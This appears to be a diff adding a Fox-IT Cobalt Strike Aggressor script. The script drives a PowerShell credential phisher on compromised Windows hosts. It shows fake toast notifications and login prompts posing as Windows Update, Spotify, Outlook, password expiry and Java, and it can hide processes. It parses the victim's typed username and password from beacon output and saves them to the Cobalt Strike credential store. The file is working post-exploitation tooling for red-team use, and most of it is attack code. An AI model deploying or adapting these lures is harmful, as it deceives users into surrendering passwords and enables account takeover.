@@ -1,0 +1,207 @@
+## Fox-IT
+## Written by Rindert Kramer
+
+####################
+#
+# Copyright (c) 2018 Fox-IT
+#
+# Permission is hereby granted, free of charge, to any person obtaining a copy
+# of this software and associated documentation files (the "Software"), to deal
+# in the Software without restriction, including without limitation the rights
+# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+# copies of the Software, and to permit persons to whom the Software is
+# furnished to do so, subject to the following conditions:
+#
+# The above copyright notice and this permission notice shall be included in all
+# copies or substantial portions of the Software.
+#
+# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISNG FROM,
+# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+# SOFTWARE.
+#
+####################
+
+
+sub callback {
+	
+	$bid = %globalsettings['bId'];
+	$credbox_title    = $3['Credbox_title'];
+	$Toast_type       = $3['Toast_type'];
+	$Application_name = $3['Application_name'];
+	$Toast_message    = $3['Toast_message'];
+	$Toast_title      = $3['Toast_title'];
+	$Hide_Process     = $3['Hide_Process'];
+	$Credbox_message  = $3['Credbox_message'];
+
+	# compose PS oneliner
+	$cmd = "Invoke-CredentialPhisher -ToastTitle \"$Toast_title\" -ToastMessage \"$Toast_message\" -Application \"$Application_name\" -credBoxTitle \"$credbox_title\" -credBoxMessage \"$Credbox_message\" -ToastType \"$Toast_type\"";	
+	
+	# Do we need to hide the process?
+	if ($Hide_Process eq "Yes") {
+		$cmd = $cmd . " -HideProcesses";
+	}
+	
+	# Load powershell script and execute it			
+	bpowershell_import($bid, script_resource("Invoke-CredentialPhisher.ps1"));
+	bpowershell($bid, $cmd);
+}
+
+on beacon_output {
+	
+	$out = $2;
+	if ('[+] Username: ' isin $out){
+	
+		$username = '';
+		$password = '';
+		
+		# Parse output
+		@lines = split('\r\n', $out);
+		foreach $line (@lines) {
+			
+			if ('[+] Username: ' isin $line){
+				$username = matches($line, '\<ToString\>\[\+\]\sUsername\:\s(.*?)\s\[\+\]\<\/ToString\>')[0];						
+			}
+			
+			if ('[+] Password: ' isin $line){				
+				$password = matches($line, '\<ToString\>\[\+\]\sPassword\:\s(.*?)\s\[\+\]\<\/ToString\>')[0];						
+			}
+		}
+		
+		if ($username ismatch '.+' || $password ismatch '.+') {
+			println("[+] Got credentials");
+			println("\tUsername: ".$username)
+			println("\tPassword: ".$password)			
+			
+			# Add to credential store
+			if ($username ismatch '.+' && $password ismatch '.+') {
+				if ('@' isin $username) {
+					$splits = split('@', $username);
+					credential_add($splits[0], $password, $splits[1]);
+				} else if ('\\' isin $username) {
+					$splits = split("\\\\", $username);
+					credential_add($splits[1], $password, $splits[0]);
+				} else {
+					credential_add($username, $password);
+				}
+			
+				println("[+] Added credentials to credential store.");
+				blog($1, "\c9 Added credentials for user '".$username."' to the credential store\c9");
+			
+			} else {
+				println("[-] Not enough information to add credentials to Cobalt Strike");
+				blog($1, "\c4Not enough information to add credentials to Cobalt Strike\c4");
+			}		
+		}			
+	} else if ('[-] User did not click on the balloon' isin $out){
+		println("[-] user did not click on the balloon.");
+		blog($1, "\c4User did not click on the balloon\c4");
+	}	
+}
+
+sub create_dialog {
+	
+	$dialog = dialog("Phish for credentials.", %(
+		Toast_title => "$1", 
+		Toast_message => "$2", 
+		Application_name => "$3", 
+		Credbox_title => "$4", 
+		Credbox_message => "$5", 
+		Toast_type => "$6", 
+		Hide_Process => "$7"), 
+		&callback);
+	dialog_description($dialog, "Modify the details below or hit launch");
+		
+		
+	drow_text($dialog, "Toast_title",  "Toast title:");
+	drow_text($dialog, "Toast_message", "Toast message:");
+	drow_text($dialog, "Application_name", "Application name:");
+	drow_text($dialog, "Credbox_title", "Credentialbox title:");
+	drow_text($dialog, "Credbox_message", "Credentialbox message:");
+	drow_combobox($dialog, "Toast_type", "Toast type:", @("Application","System"));
+	drow_combobox($dialog, "Hide_Process", "Hide processes:", @("Yes", "No"));
+	
+	
+	dbutton_action($dialog, "Launch");
+	dialog_show($dialog);
+}
+
+
+popup beacon {
+	
+	
+	### Template for adding more phishing options
+	#item " " {		
+	#create_dialog("", 	# Toast Title
+	#     		  "",	# Toast message
+	#			  "",	# Application name (outlook, spotify, etc.)
+	#			  "",	# Credentialbox title
+	#			  "",	# Credentialbox message
+	#			  "",	# ToastType (System or Application)
+	#			  ""); 	# Hide processes
+	#}
+
+	# Store beaconID in a globalvariable. 
+	# We change the scope a few times which change the value of $1
+	%globalsettings['bId'] = $1;
+	
+	separator();
+	menu "&Phish credentials" {
+		item " Windows Update - restart pending" {			
+			create_dialog("Updates are available", 
+						  "Your computer will restart in 5 minutes to install the updates",
+						  "Control Panel",
+						  "Credentials needed",
+						  "Please specify your credentials in order to postpone the updates",
+						  "System",
+						  "No");
+		}
+		item " Spotify - Premium subscription ended" {
+			create_dialog("Spotify Account Helper", 									
+						  "Your Spotify Premium subscription will be cancelled at the end of this month",	
+						  "Spotify",										
+						  "Spotify",										
+						  "Enter your Spotify username and password",						
+						  "Application",									
+						  "Yes"); 										
+		}
+		item " Outlook - Connection lost" {
+			create_dialog("Microsoft Office Outlook", 
+						  "Connection to Microsoft Exchange has been lost.`r`nClick here to restore the connection",
+						  "Outlook",
+						  "Microsoft Outlook",
+						  "Enter password for user '{emailaddress|samaccountname}'",
+						  "Application",
+						  "Yes");
+		}
+		
+		item " Password - Password expires" {
+			create_dialog("Consider changing your password", 
+						  "Your password will expire in 5 minutes.`r`nTo change your password, click here or press CTRL+ALT+DELETE and then click 'Change a password'.",
+						  "Control Panel",
+						  "Windows Password reset",
+						  "Enter password for user '{samaccountname}'",
+						  "Application",
+						  "No");
+		}
+		
+		item " Java - New update available" {		
+			create_dialog("Java Update Available", 						
+						  "A new version of Java is ready to be installed",	
+						  "Configure Java",					
+						  "Java Update Checker",				
+					      "Please enter your credentials to update Java",	
+						  "Application",				
+						  "No"); 					
+		}
+		separator();
+		item " New scenario" {
+			create_dialog("","","","","","","");											
+		}
+	}		
+}
+
+
